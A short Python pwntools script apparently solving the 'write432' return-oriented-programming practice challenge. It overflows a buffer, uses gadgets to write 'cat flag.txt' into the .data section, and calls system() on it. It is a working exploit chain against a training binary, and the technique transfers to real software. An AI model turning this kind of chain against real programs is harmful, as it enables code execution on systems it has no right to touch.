from pwn import *
import struct


def write_command(input_command, addr):
    if len(input_command) % 4 == 0:
        input_command += "\x00" * 4  # add 'null terminate' at the end (must be multiplication of 4)
    else:
        input_command += (4 - (len(input_command) % 4)) * "\x00"  # pad the rest with \x00

    payload = ""
    for i in xrange(0, len(input_command), 4):
        payload += p32(0x080486da)  # pop edi; pop ebp; ret;
        payload += p32(addr+i)
        payload += input_command[i:i + 4]
        payload += p32(0x08048670)  # ret = 0x08048670: mov dword ptr [edi], ebp; ret;

    return payload


e = ELF("/home/osboxes/PycharmProjects/ROP/write432/write432")

crap = "A" * 44
system_addr = p32(0x0804865a)
data_section_addr = e.get_section_by_name(".data").header.sh_addr
# command = '/bin/cat flag.txt' + '\x00'
command = 'cat flag.txt'

payload = crap
payload += write_command(command, data_section_addr)  # first add the command to the .data address in groups of 4
payload += system_addr  # ret = system_addr
payload += p32(data_section_addr)

io = e.process()

io.sendline(payload)

io.interactive()
